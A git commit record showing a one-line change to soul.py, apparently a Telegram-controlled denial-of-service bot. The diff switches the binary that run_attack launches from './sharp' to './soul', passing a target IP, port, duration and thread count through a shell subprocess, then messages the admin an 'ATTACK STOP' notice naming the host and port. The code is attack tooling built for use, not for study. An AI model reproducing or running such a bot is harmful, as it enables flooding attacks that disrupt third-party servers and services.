bc0bf2a55932599784325ddecf9e6b02aea3badd
Yashasvi Srivastava <99003521+yash-2507@users.noreply.github.com>
2025-01-19 20:12:58 +0530

    Update soul.py

--- soul.py
+++ soul.py
@@ -84,7 +84,7 @@ async def run_attack(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True
     try:
-        process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 1000")
+        process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 1000")
         await process.communicate()
         bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
     except Exception as e:
